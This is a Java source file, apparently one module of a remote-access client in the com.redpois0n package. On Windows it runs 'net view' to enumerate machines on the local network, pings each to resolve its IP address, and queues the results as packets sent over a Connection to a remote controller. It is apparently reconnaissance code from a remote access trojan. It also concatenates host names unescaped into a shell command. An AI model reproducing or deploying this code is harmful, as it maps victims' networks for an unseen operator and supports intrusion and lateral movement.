package com.redpois0n;
import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.redpois0n.common.os.OperatingSystem;
import com.redpois0n.packets.Header;
import com.redpois0n.packets.PacketBuilder;


public class Lan extends Thread {
	
	public void run() {
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Process p = Runtime.getRuntime().exec("net view");
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
				String line;
				while ((line = reader.readLine()) != null) {
					line = line.trim().replaceAll(" +", " ");
					if (line.startsWith("\\\\")) {
						line = line.substring(2, line.length());
						if (line.split(" ").length > 1) {
							line = line.split(" ")[0];
						}
						Process ping = Runtime.getRuntime().exec("ping -n 1 " + line);
						BufferedReader preader = new BufferedReader(new InputStreamReader(ping.getInputStream()));
						preader.readLine();
						String ip = preader.readLine();
						if (ip != null) {
							ip = ip.substring(ip.indexOf("[") + 1, ip.lastIndexOf("]"));
						}
						preader.close();
						
						Connection.addToSendQueue(new PacketBuilder(Header.LAN, new String[] { line, ip == null ? "Unknown" : ip }));
					}
				}
				reader.close();
				Connection.addToSendQueue(new PacketBuilder(Header.LAN, "DONE"));
			} else {
				throw new Exception();
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			Connection.addToSendQueue(new PacketBuilder(Header.LAN, "FAIL"));
		}
	}

}
